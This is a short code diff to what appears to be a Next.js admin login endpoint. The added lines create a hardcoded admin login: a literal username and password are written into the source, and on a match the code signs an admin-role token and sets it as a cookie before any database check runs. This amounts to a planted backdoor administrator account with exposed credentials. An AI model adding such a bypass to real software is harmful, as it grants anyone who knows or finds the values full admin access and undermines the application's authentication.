@@ -12,6 +12,21 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'Missing credentials' }, { status: 400 });
     }
 
+    // Hardcoded admin login
+    if (email === 'ankitadmin2026' && password === 'ankit_755_24-27') {
+      const token = signToken({ id: 'hardcoded-admin-id', role: 'admin', xts_id: 'admin' });
+      
+      const res = NextResponse.json({ success: true, redirect: '/admin' });
+      res.cookies.set('token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'strict',
+        maxAge: 86400 // 1 day
+      });
+
+      return res;
+    }
+
     await connectToDatabase();
     
     const user = await User.findOne({ email, role: 'admin' });
